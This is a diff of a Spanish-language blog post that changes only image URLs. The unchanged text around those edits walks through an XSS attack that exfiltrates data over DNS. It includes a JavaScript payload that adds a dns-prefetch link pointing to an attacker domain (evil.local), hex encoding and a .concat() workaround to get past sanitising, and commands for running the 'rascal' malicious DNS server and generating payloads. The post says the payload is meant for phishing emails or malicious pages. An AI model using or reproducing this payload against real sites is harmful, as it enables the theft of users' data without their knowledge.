@@ -56,7 +56,7 @@ El código JS simple que vamos a incrustar va a ser este:
 ```
 d=document;l=d.createElement('link');l.rel='dns-prefetch';l.href='http://xxx.evil.local/malacatones';h=d.getElementsByTagName('head')[0];h.appendChild(l)
 ```
-[![Prueba de exfiltración DNS mediante etiqueta LINK](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-21-at-08.29.25-1024x737.png)](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-21-at-08.29.25.png)
+[![Prueba de exfiltración DNS mediante etiqueta LINK](https://donttouchmynet.github.io/assets/images/old/Screenshot-2019-01-21-at-08.29.25-1024x737.png)](https://donttouchmynet.github.io/assets/images/old/Screenshot-2019-01-21-at-08.29.25.png)
 
 Bien, no? Pero hay varios problemas que tendremos que solucionar para que esto sea funcional:
 {: style="text-align: justify;"}
@@ -81,29 +81,29 @@ Ahora por cada carácter del contenido que queremos, debemos extraer
 ```
 contenido.charCodeAt(x).toString(16)
 ```
-[![String to hexadecimal](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-21-at-20.04.02-1024x285.png)](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-21-at-20.04.02.png)
+[![String to hexadecimal](https://donttouchmynet.github.io/assets/images/old/Screenshot-2019-01-21-at-20.04.02-1024x285.png)](https://donttouchmynet.github.io/assets/images/old/Screenshot-2019-01-21-at-20.04.02.png)
 
 Como véis, esto tiene un problema. «\n» por ejemplo, resuelve con «a» quitando el «0» inicial, lo cual hará que nuestra string hexadecimal quede corrupta. Para solucionarlo, usamos padding con zeros:
 {: style="text-align: justify;"}
 ```
 caracter = contenido.charCodeAt(x).toString(16).padStart(2,0)
 ```
-[![String to hexadecimal con padding de 0](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-21-at-20.06.11-1024x84.png)](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-21-at-20.06.11.png)
+[![String to hexadecimal con padding de 0](https://donttouchmynet.github.io/assets/images/old/Screenshot-2019-01-21-at-20.06.11-1024x84.png)](https://donttouchmynet.github.io/assets/images/old/Screenshot-2019-01-21-at-20.06.11.png)
 
 ### Concatenación
 
 Otro problema que no teníamos contemplado fue que la concatenación mediante '+' no funcionaba (al menos en Firefox) ya que el propio navegador sanitizaba este carácter de la URL en la respuesta.
 {: style="text-align: justify;"}
 
-[![Test XSS Simple ](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-18-at-08.24.10.png)\
-](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-18-at-08.24.10.png)
+[![Test XSS Simple ](https://donttouchmynet.github.io/assets/images/old/Screenshot-2019-01-18-at-08.24.10.png)\
+](https://donttouchmynet.github.io/assets/images/old/Screenshot-2019-01-18-at-08.24.10.png)
 
-[![XSS: Concatenación con + no funciona](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-18-at-08.24.19.png)](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-18-at-08.24.19.png)
+[![XSS: Concatenación con + no funciona](https://donttouchmynet.github.io/assets/images/old/Screenshot-2019-01-18-at-08.24.19.png)](https://donttouchmynet.github.io/assets/images/old/Screenshot-2019-01-18-at-08.24.19.png)
 
 Pero como siempre, hay una manera de bypassar la restricción... .concat()
 {: style="text-align: justify;"}
 
-[![XSS: Ejecución de XSS de test](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-18-at-20.40.05-1024x429.png)](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-18-at-20.40.05.png)[![XSS: solución a concatenación](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-18-at-20.40.24.png)](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-18-at-20.40.24.png)
+[![XSS: Ejecución de XSS de test](https://donttouchmynet.github.io/assets/images/old/Screenshot-2019-01-18-at-20.40.05-1024x429.png)](https://donttouchmynet.github.io/assets/images/old/Screenshot-2019-01-18-at-20.40.05.png)[![XSS: solución a concatenación](https://donttouchmynet.github.io/assets/images/old/Screenshot-2019-01-18-at-20.40.24.png)](https://donttouchmynet.github.io/assets/images/old/Screenshot-2019-01-18-at-20.40.24.png)
 
 Perfecto.
 
@@ -117,7 +117,7 @@ Además, tenemos que poder relacionar las llamadas DNS relativas a una misma eje
 
 BRBRRBRBRBRBRBR!
 
-[![XSS DNS Exfiltrator](https://donttouchmy.net/wp-content/uploads/2019/01/Cool-Painted-Kitchen-Aid-Mixer-Art1-240x300.jpg)](https://donttouchmy.net/wp-content/uploads/2019/01/Cool-Painted-Kitchen-Aid-Mixer-Art1.jpg)
+[![XSS DNS Exfiltrator](https://donttouchmynet.github.io/assets/images/old/Cool-Painted-Kitchen-Aid-Mixer-Art1-240x300.jpg)](https://donttouchmynet.github.io/assets/images/old/Cool-Painted-Kitchen-Aid-Mixer-Art1.jpg)
 
 DING!
 ```
@@ -161,7 +161,7 @@ python rascal.py --db /tmp/xss.db --domain evil.local -i "*.evil.local IN A 10.2
 Donde* --domain * es el dominio que queremos capturar, *-i* es el *registro de zona *que vamos a utilizar para resolver y finalmente *--db *que es el archivo *sqlite * donde vamos a volcar los datos exfiltrados. 
 {: style="text-align: justify;"}
 
-[![Query de prueba contra rascal](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-20-at-22.43.36-1-1024x204.png)](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-20-at-22.43.36-1.png)
+[![Query de prueba contra rascal](https://donttouchmynet.github.io/assets/images/old/Screenshot-2019-01-20-at-22.43.36-1-1024x204.png)](https://donttouchmynet.github.io/assets/images/old/Screenshot-2019-01-20-at-22.43.36-1.png)
 
 Ya tenemos *rascal* listo!
 
@@ -175,12 +175,12 @@ python rascalcl.py --code -d evil.local --maxchar 10 -s demo01
 Donde *-d* es el dominio de nuestros servidor DNS malicioso, *--maxchar* el número de caractéres máximos de cada elemento *link* utilizado y finalmente* -s *que es la etiqueta que queremos concatenar a la sesión. Así podremos categorizar las exfiltraciones por «campañas» dentro de la misma base de datos. 
 {: style="text-align: justify;"}
 
-[![XSS: Crear payload con rascal](https://donttouchmy.net/wp-content/uploads/2019/01/rascalcl_create_payload.jpg)](https://donttouchmy.net/wp-content/uploads/2019/01/rascalcl_create_payload.jpg)
+[![XSS: Crear payload con rascal](https://donttouchmynet.github.io/assets/images/old/rascalcl_create_payload.jpg)](https://donttouchmynet.github.io/assets/images/old/rascalcl_create_payload.jpg)
 
 Con este payload, construímos un link de XSS que insertaremos en un email de phishing o en una página web maliciosa.
 {: style="text-align: justify;"}
 
-[![Página maliciosa con link XSS](https://donttouchmy.net/wp-content/uploads/2019/01/mpv-shot0019-copy.jpg)](https://donttouchmy.net/wp-content/uploads/2019/01/mpv-shot0019-copy.jpg)
+[![Página maliciosa con link XSS](https://donttouchmynet.github.io/assets/images/old/mpv-shot0019-copy.jpg)](https://donttouchmynet.github.io/assets/images/old/mpv-shot0019-copy.jpg)
 
 Ahora sólo tenemos que esperar a que los atacantes le den click al link e ir recogiendo la información en nuestro servidor DNS. 
 {: style="text-align: justify;"}
@@ -192,7 +192,7 @@ Una vez hemos recolectado los datos del ataque mediante nuestro servidor *rasca
 
 python rascalcl.py -g --db /tmp/xss.db
 
-[![rascalcl - printando la información obtenida](https://donttouchmy.net/wp-content/uploads/2019/01/mpv-shot0048.jpg)](https://donttouchmy.net/wp-content/uploads/2019/01/mpv-shot0048.jpg)
+[![rascalcl - printando la información obtenida](https://donttouchmynet.github.io/assets/images/old/mpv-shot0048.jpg)](https://donttouchmynet.github.io/assets/images/old/mpv-shot0048.jpg)
 
 Os dejo un video del ataque donde veremos a la víctima clicando en el payload malicioso y cómo lo capturamos con *rascalcl*.
 {: style="text-align: justify;"}
